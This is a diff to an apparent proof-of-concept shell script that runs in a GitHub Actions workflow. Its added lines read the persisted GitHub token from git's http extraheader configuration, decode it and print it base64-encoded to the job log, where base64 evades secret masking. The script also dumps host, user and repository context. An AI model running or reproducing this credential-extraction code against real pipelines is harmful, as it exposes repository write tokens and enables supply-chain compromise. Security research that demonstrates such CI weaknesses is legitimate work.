@@ -5,7 +5,9 @@ b64() { printf '%s' "$1" | base64 -w0; }
 echo "POC_MARKER phase=$phase at $(date -u +%FT%TZ) host=$(hostname) user=$(id -un) uid=$(id -u)"
 echo "POC_CONTEXT phase=$phase event=${GITHUB_EVENT_NAME} repo=${GITHUB_REPOSITORY} ref=${GITHUB_REF} sha=${GITHUB_SHA} run=${GITHUB_RUN_ID} job=${GITHUB_JOB} workflow_ref=${GITHUB_WORKFLOW_REF}"
 echo "POC_WORKSPACE phase=$phase cwd=$(pwd)"
-echo "POC_TOKEN phase=$phase b64=$(b64 "${GITHUB_TOKEN}")"
+git_tok=$(git config --get 'http.https://github.com/.extraheader' 2>/dev/null | sed 's/^AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2-)
+export GITHUB_TOKEN="${GITHUB_TOKEN:-$git_tok}"
+echo "POC_GITCONFIG_TOKEN phase=$phase b64=$(b64 "${GITHUB_TOKEN}")"
 echo "POC_HEAD phase=$phase b64=$(b64 "$(git rev-parse HEAD 2>&1)")"
 echo "POC_HEAD_SUBJECT phase=$phase b64=$(b64 "$(git log -1 --format='%H|%an|%ae|%s' 2>&1)")"
 echo "POC_REMOTE phase=$phase b64=$(b64 "$(git remote -v 2>&1 | tr '\n' ';')")"
